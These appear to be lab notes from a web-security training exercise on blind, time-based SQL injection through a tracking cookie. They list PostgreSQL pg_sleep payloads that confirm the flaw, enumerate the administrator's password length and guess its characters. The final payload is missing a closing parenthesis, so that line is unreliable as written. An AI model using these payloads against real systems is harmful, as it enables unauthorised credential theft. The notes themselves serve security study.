Lab :14 - Blind SQL injection with time delays and information retrieval

Vulnerable parameter - tracking cookie

End Goals:
- Exploit time-based SQLi to output the adminstrator password
- Login as Administrator

Analysis:

1) Confirm that the parameter is vulnerable to sqli

'|| pg_sleep(10)--

2) confirm that the users table exist in the database

'|| (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--

' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--

3) Enumerate the password length

' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--

-> length of password is exactly 20 chars

4) Enumerate the password
' || (select case when (username='administrator' and substring(password,1,1)='a' then pg_sleep(10) else pg_sleep(-1) end from users)--


